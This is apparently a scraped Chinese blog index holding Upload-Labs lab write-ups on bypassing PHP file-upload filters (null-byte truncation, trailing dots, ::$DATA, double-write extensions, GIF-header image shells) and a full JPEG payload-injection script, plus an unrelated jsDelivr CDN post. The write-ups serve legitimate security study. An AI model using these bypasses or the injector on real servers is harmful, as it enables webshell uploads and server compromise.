unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-binData = ''; $this-order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-binData = file_get_contents($filename); } else { $this-binData = $filename; } $this-size = strlen($this-binData); } public function seek() { return ($this-size - strlen($this-binData)); } public function skip($skip) { $this-binData = substr($this-binData, $skip); } public function readByte() { if($this-eof()) { die('End Of File'); } $byte = substr($this-binData, 0, 1); $this-binData = substr($this-binData, 1); return ord($byte); } public function readShort() { if(strlen($this-binData) binData, 0, 2); $this-binData = substr($this-binData, 2); if($this-order) { $short = (ord","date":"2020-11-16","objectID":"/posts/upload-labs4/:4:3","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#插入代码"},{"categories":["DROPS"],"content":"jpg格式​ 同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码 ?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"\"; if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed'); } if(!isset($argv[1])) { die('php jpg_payload.php '); } set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad readShort() != 0xFFD8) { die('Incorrect SOI marker'); } while((!$dis-eof()) \u0026\u0026 ($dis-readByte() == 0xFF)) { $marker = $dis-readByte(); $size = $dis-readShort() - 2; $dis-skip($size); if($marker === 0xDA) { $startPos = $dis-seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-eof())) { if($dis-readByte() === 0xFF) { if($dis-readByte !== 0x00) { break; } } } $stopPos = $dis-seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage('payload_'.$argv[1], $outStream)) { die('Success!'); } else { break; } } } } unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-binData = ''; $this-order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-binData = file_get_contents($filename); } else { $this-binData = $filename; } $this-size = strlen($this-binData); } public function seek() { return ($this-size - strlen($this-binData)); } public function skip($skip) { $this-binData = substr($this-binData, $skip); } public function readByte() { if($this-eof()) { die('End Of File'); } $byte = substr($this-binData, 0, 1); $this-binData = substr($this-binData, 1); return ord($byte); } public function readShort() { if(strlen($this-binData) binData, 0, 2); $this-binData = substr($this-binData, 2); if($this-order) { $short = (ord","date":"2020-11-16","objectID":"/posts/upload-labs4/:4:3","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#上传并验证"},{"categories":["DROPS"],"content":"前言​ 继续接着上一次的Upload-labs往下写。这记下第11-15题，目前进度是20题都已经完成正在抽时间写博客，然后16题是我卡的最久的关，不过也学到了感觉很牛的姿势，所以到时候专门开一篇只讲16。 ​ 在线靶机地址： linux环境 windows环境 ","date":"2020-11-16","objectID":"/posts/upload-labs3/:1:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(三)","uri":"/posts/upload-labs3/#前言"},{"categories":["DROPS"],"content":"Pass-11​ (这题使用了windows环境) ​ 源码： $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = '上传出错！'; } } else{ $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; } } ​ 分析代码发现是一个白名单验证，但是和之前不同点在于路径中使用了$_GET['save_path']，本题提示也写道 本pass上传路径可控！，就是通过这个GET变量控制上传路径。 ​ 这一关的突破方法需要有一些条件：php版本需要低于5.3.29（我使用的是php版本5.3.17的本地靶机），另一个条件是magic_quotes_gpc需要为关闭状态。magic_quotes_gpc的作用官方文档写道： Warning 本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。 ​ 为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。 当 magic_quotes 为 on，所有的 ' (单引号)、\" (双引号)、\\（反斜杠）和 NUL’s 被一个反斜杠自动转义。 ​ 使用bp抓包并添加0x00截断，在GET请求中可以使用url编码的截断：%00。贴个自己参考的博客，截断上传原理剖析。个人对于这道题的分析就是，上面文件的代码执行到第8行的时候，获取到了$_GET['save_path']变量的值，但是我们在这个变量后面添加了0x00截断，所以后面的代码便不会执行，文件也就不会被重命名。 ​ 文件成功上传，然后访问的时候记得改一下路径，因为文件名已经截断，所以访问路径由..../upload/233.php�/5120201115205501.jpg变为..../upload/233.php。完工 ","date":"2020-11-16","objectID":"/posts/upload-labs3/:2:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(三)","uri":"/posts/upload-labs3/#pass-11"},{"categories":["DROPS"],"content":"Pass-12​ （windows环境） ​ 这题和上一题差不多一样，就是把$_GET['save_path']变成了$_POST['save_path']。由GET请求改成了POST请求，但是抓包修改的地方就不一样了，需要通过16进制修改 ​ 这里我命名为233.phpa是因为方便我在Hex表中找到这句话的位置和修改数据。a的16进制是61，需要改成截断的值：00 ​ 上传成功以后打开图片，和上一题一样，需要把路径中已经截断的后面删除掉。完工 ","date":"2020-11-16","objectID":"/posts/upload-labs3/:3:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(三)","uri":"/posts/upload-labs3/#pass-12"},{"categories":["DROPS"],"content":"Pass-13​ （Linux环境） ​ 源码中有关的函数解释： PHP中pack、unpack的详细用法 fread() fclose() intval() ​ 这道题和前面题目都不一样了： ​ 题目说道需要上传图片马，然后使用文件包含漏洞进行测试，那么我们就先制作图片马。 ​ 查看本题的提示本pass检查图标内容开头2个字节！，意思就是只检测文件前面两个字节的标识，贴一个各种格式图片文件头标识分析，所以这道题只用在上传的文件头部的两个字节处粘贴对应文件的头标识即可绕过检测。 ​ 以GIF的文件头GIF89a 为例，创建文件notepad++编辑打开输入GIF89a\u003c?php phpinfo(); ?\u003e，后缀名无所谓了，因为题目只检测前两个字节即可上传。 ​ 还有一种方法制作图片马：使用windows的copy /b指令，把两个文件进行无缝拼接，可以使用一张正常的图片加一个php文件进行拼接，即可正常上传。参考博客：windows窗口命令——(copy/b)文件无缝拼接隐藏。 ​ 别忘了题目中说道了需要三种后缀都上传成功才算过关！ ​ 上传以后需要使用文件包含进行判定是否执行，先在新标签页面中打开图片，url中记下图片在服务器中的目录和名称（我的图片名称为8220201116071327.gif），点击2的链接进入include.php进行文件包含：网址输入https://...../include.php?file=./upload/8220201116071327.gif，找到php成功执行的页面。这里还有一个小知识点我学到的就是：路径中的'.‘和’..‘还有’./‘和’../‘都是什么意思。完工 ","date":"2020-11-16","objectID":"/posts/upload-labs3/:4:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(三)","uri":"/posts/upload-labs3/#pass-13"},{"categories":["DROPS"],"content":"Pass-14​ （Linux环境） ​ 这题提示写道本pass使用getimagesize()检查是否为图片文件！，和上一题不一样的地方就是使用了getimagesize()函数，这个函数的官方文档getimagesize()，所以这道题就不能用13题的加文件的头标识方法绕过，这次要使用上一题中的copy /b指令用一张正常的图片进行拼接还是可以通过的。 ​ PS：听同学说getimagesize()不过是检测了前八个字节，不过我没试。 ​ 因为是拼接的，所以要直接摸到图片最底部查看成功。完工 ","date":"2020-11-16","objectID":"/posts/upload-labs3/:5:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(三)","uri":"/posts/upload-labs3/#pass-14"},{"categories":["DROPS"],"content":"Pass-15​ （Linux环境） ​ 13、14、15题都是对文件的头标识进行了检测，只不过第十四关使用的是getimagesize函数，第十五关使用的是exif_imagetype函数,函数返回值内容不一样而已。使用copy /b制作的图片马可以直接通过。 ​ 网上搜集过来的资料 png 文件头 89504E470D0A1A0A jpg 文件头 89504E470D0A1A0A gif 文件头 474946383961 ​ 这几个字节应该都是够长的可以绕过这三个函数，所以验证了同学说的不同的函数检测的文件头长度是不一样的。完工 ","date":"2020-11-16","objectID":"/posts/upload-labs3/:6:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(三)","uri":"/posts/upload-labs3/#pass-15"},{"categories":["瞎折腾"],"content":"前言​ 这几天总感觉博客访问特别慢，最先是找到了CDN加速，但是在国内加速的话域名都是要备案的，又看了看境外加速。 CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科 在犹豫要不要买的时候，发现了这个东西：jsdelivr，一个可以加速静态资源的免费CDN，官网上能看的出和WordPress有什么py关系还可以加速github的资源。hexo是静态博客，那么我就把博客要用到的js、css、还有博客用到的一些图片都放github然后引用。开搞 ","date":"2020-11-11","objectID":"/posts/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/:1:0","series":null,"tags":["jsdelivr"],"title":"jsDelivr加速静态博客","uri":"/posts/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/#前言"},{"categories":["瞎折腾"],"content":"1. 新建仓库​ 名字重了是因为我已经创建好了并且使用了以后才来写的博客。 ","date":"2020-11-11","objectID":"/posts/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/:2:0","series":null,"tags":["jsdelivr"],"title":"jsDelivr加速静态博客","uri":"/posts/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/#1-新建仓库"},{"categories":["瞎折腾"],"content":"2. 克隆Git仓库到本地​ 在自己电脑建个文件夹然后打开git输入git clone 你仓库的链接，把刚刚创建的仓库拉倒本地方便上传到仓库。 廖雪峰老师的git教程我当时看了一遍，觉得非常棒，哈哈哈就是自己太菜了又给忘了，帖出来：Git简介。 ","date":"2020-11-11","objectID":"/posts/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/:3:0","series":null,"tags":["jsdelivr"],"title":"jsDelivr加速静态博客","uri":"/posts/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/#2-克隆git仓库到本地"},{"categories":["瞎折腾"],"content":"3. 上传需要加速的资源​ 把需要上传的资源整理到刚刚拉下来的本地git仓库，上传。 git status //查看状态 git add . //添加所有文件到暂存区 git commit -m '第一次提交' //把文件提交到仓库 git push //推送至远程仓库 ​ 这里我说一下是怎么加速自己的博客的，因为博客加载的时候需要加载主题的各种js和css文件，然后因为服务器网渣所以加载时间很慢，使用加速的话就会加载的快。 ​ 接下来是要上传哪些文件，我使用的是butterfly这个主题，主题github支持一下作者，直接在主题theme/butterfly文件夹下面找到资源文件夹source发现里面都是一些零碎的文件，但是在发布文件夹public下是一个完整的js和css，所以猜测生成的时候会把零碎的文件进行整合，然后主题配置文件里作者也写的很清楚 穷人流下了不争气的泪。传！(真加速还得选好服务器) ​ 这里我的分析是：由于引用的不是本地的资源文件，所以可能会产生自己在本地修改了某项配置，但是网页没有生效，这里就需要时刻记着自己引用的是github上的资源，如果本地配置大改的话，github上的文件也要进行重新上传覆盖。 ​ 做法：配置文件里找到引用的是本地资源的项，然后在生成网站的public文件下找到对应的资源文件。 我列一下我在配置文件里修改的项：main_css、main、utils、local_search、algolia_js、translate，因为使用的是Valine评论，里面可以设置自定义表情，我也使用这个方法修改了。 ","date":"2020-11-11","objectID":"/posts/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/:4:0","series":null,"tags":["jsdelivr"],"title":"jsDelivr加速静态博客","uri":"/posts/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/#3-上传需要加速的资源"},{"categories":["瞎折腾"],"content":"3. 获取地址​ 官网首页很清楚的写明了如何获取资源链接 ​ https://cdn.jsdelivr.net/gh/user/repo@version/file，user就是你的github用户名，repo@version，仓库加上版本号，file就是仓库下的路径。 ​ 这里我没有说版本号是因为网上的教程讲到了仓库需要发布，但是我后面无意间发现不用发布直接reop@分支名，也可以访问到。并且我一开始也发布仓库了，但是后面想要修改已经上传的文件也出了一些问题，索性直接用简单的。 ​ 贴一个我博客首页的壁纸链接：https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/top_img/83531406_p0.png ​ 这个壁纸有12M大小，而且链接也符合上面的格式，可以参考一下。 ","date":"2020-11-11","objectID":"/posts/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/:5:0","series":null,"tags":["jsdelivr"],"title":"jsDelivr加速静态博客","uri":"/posts/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/#3-获取地址"},{"categories":["瞎折腾"],"content":"4. 引用链接​ 配置文件里可以找需要替换的资源，直接贴上链接就可以了，只不过以后别忘了你现在引用的是之前的上传的静态资源，别忘啦！别忘啦！别忘啦！ ​ 我发现github能这样用以后就在上面整了图床，现在博客里的图片都开始在上传，之前用的路过图床，说的全球都有CDN加速，但是还是卡的一。 ​ 还有我整理的Valine评论的自定义表情，大伙可以直接拿去用：图片地址，emojimap。完工 ","date":"2020-11-11","objectID":"/posts/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/:6:0","series":null,"tags":["jsdelivr"],"title":"jsDelivr加速静态博客","uri":"/posts/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/#4-引用链接"},{"categories":["DROPS"],"content":"前言​ 这次彻底的从头到尾分析了一下源码的执行过程，大致的写一下，以防以后再看的时候不知道题目是什么情况。 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { //这里下面是过滤 $deny_ext = array(\".php\",\".php5\",\".php4\",\".html\", ......); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 //这里下面是移动文件。 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 过滤部分： $deny_ext是一个过滤的后缀数组，只要是在里面的后缀都是被禁止上传的。 $file_name = trim($FILES['upload_file']['name'])这段代码有两个点需要说： $FILES['upload_file']['name']是获取上传文件的名称，PHP中$FILES是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $FILES 为二维数组；如果为多个文件上传，那么 $FILES 为三维数组。贴一个参考的博客：PHP $_FILES函数详解。 trim()函数的作用就是去除文件名称前后的空格换行符等。 $file_name = deldot($file_name)这个注释中很清楚，是删除文章末尾的点。 $file_ext = strrchr($file_name, '.')中strrchr(string s1,char c1)函数查找字符或字符串c1在另一个字符串s1中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。说白了就是获取文件的后缀名。 $file_ext = strtolower($file_ext)注释上转换小写。 $file_ext = str_ireplace('::$DATA', '', $file_ext)去除字符串::$DATA。第八题讲了原理 上传部分： in_array($file_ext, $deny_ext)判断文件的后缀(第一个参数)是不是在黑名单数组(第二个参数)中。 $_FILES['upload_file']['tmp_name']文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定。 $img_path = UPLOAD_PATH.'/'.$file_name这个变量是设置需要保存到的路径 move_uploaded_file($temp_file, $img_path)本函数检查并确保指定的文件(第一个参数)是合法的上传文件(即通过 PHP 的 HTTP POST 上传机制所上传的)。如果文件合法，则将其移动为由指定的文件路径(第二个参数)。 ","date":"2020-11-09","objectID":"/posts/upload-labs2/:1:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(二)","uri":"/posts/upload-labs2/#前言"},{"categories":["DROPS"],"content":"Pass-06源码： $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } ​ 看源码发现少了trim()函数对文件名前后的空格处理，所以我们可以在上传文件时在后缀名后面添加空格使其成为.php (有空格)绕过黑名单数组。 ​ 上传以后访问文件执行成功。完工 ​ 这里说明一下，我前面是在BUUCTF在线靶场上做的linux环境下的题目，但是这道题用了上面的方法怎么都访问不到，所以我在本地windows环境上搭建了一个靶机进行上传(而且后面有道题必须是在windows环境下才可以通过)。在github上下载的源码题目比在线靶场上的题目多了一道，对应的题目为 在线靶机pass-06–\u003egithub下载的pass-07。默认使用的都是linux环境下的题目，有改变会提前说明。 ​ ","date":"2020-11-09","objectID":"/posts/upload-labs2/:2:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(二)","uri":"/posts/upload-labs2/#pass-06"},{"categories":["DROPS"],"content":"Pass-07源码： $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } ​ 这道题少了删除文件名末尾的点，我们可以通过构造2333.php. .(末尾加 点 空格 点)，被解析后文件后缀就会成为\". “(一个点一个空格)，可以绕过黑名单，访问的文件名是2333.php. . ​ 我又参考了其他博客，讲到windows环境下可以利用系统会自动删除后缀中最后的一个”.\"，尝试在windows靶机上测试只添加一个点，访问的文件名为2333.php、2333.php.都可以，因为windows会删除最后一个点。 ​ 两种方式第一个在linux环境下的php服务器上，第二个在windows环境下的php服务器上，上传后都可以成功访问文件。完工 ","date":"2020-11-09","objectID":"/posts/upload-labs2/:3:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(二)","uri":"/posts/upload-labs2/#pass-07"},{"categories":["DROPS"],"content":"Pass-08源码： $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } ​ 审查代码发现少了对::$DATA字符串的处理，这里就要用到前面提到的windows环境了，贴一下原理： php在window的时候如果文件名+\"::$DATA\"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持\"::$DATA\"之前的文件名 ​ 直接上传的时候抓包在文件名后面添加::$DATA。 ​ 上传访问。完工 ","date":"2020-11-09","objectID":"/posts/upload-labs2/:4:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(二)","uri":"/posts/upload-labs2/#pass-08"},{"categories":["DROPS"],"content":"Pass-09 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } ​ 这次题目和第七题差不多，代码会先剔除文件名前后的空格，然后删除末尾的点，再通过strrchr()函数截取后缀名转换小写。 ​ 所以和第七题一样构造2333.php. .(末尾加 点 空格 点)，被处理后的文件名后缀就成了一个点\".\"，铁定不在黑名单后缀里，实现绕过后缀检查。 ​ 但是这道题只能使用windows环境，因为执行了deldot()函数删除了最后一个点之后，文件名成了2333.php.，而linux环境下因为不会自动删除最后一个点而不能访问成功。 ​ 图前面有了就不贴了。 ","date":"2020-11-09","objectID":"/posts/upload-labs2/:5:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(二)","uri":"/posts/upload-labs2/#pass-09"},{"categories":["DROPS"],"content":"Pass-10源码： $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } ​ 这道题和前面不同的是$file_name = str_ireplace($deny_ext,\"\", $file_name)，对于这个函数：str_ireplace(find,replace,string,count)，find是要查找的值，replace是要替换成的值，string是被搜索的字符串，count 可选。一个变量，对替换数进行计数。所以这行代码的作用就是把文件名中所有包含在黑名单后缀里的字符串替换成空串，但是这个函数只会执行一次，所以我们可以构造一个双写绕过，即构造文件名2333.pphphp，只有一个\"php\"字符串被匹配到并被替换成空串，剩下的文件名就成了2333.php。 上传并访问文件。完工 ","date":"2020-11-09","objectID":"/posts/upload-labs2/:6:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(二)","uri":"/posts/upload-labs2/#pass-10"},{"categories":["DROPS"],"content":"介绍 大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。 在线靶机地址： linux环境 windows环境 ","date":"2020-11-08","objectID":"/posts/upload-labs1/:1:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(一)","uri":"/posts/upload-labs1/#介绍"},{"categories":["DROPS"],"content":"Pass-01​ 尝试上传php木马，发现提示上传错误 ​ 提示只能上传jpg、png、gif类型的图片。查看源码发现是一个前端的后缀过滤，那么我们尝试绕过前端的JS代码。 ​ 源码： function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") { alert(\"请选择要上传的文件!\"); return false; } //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); 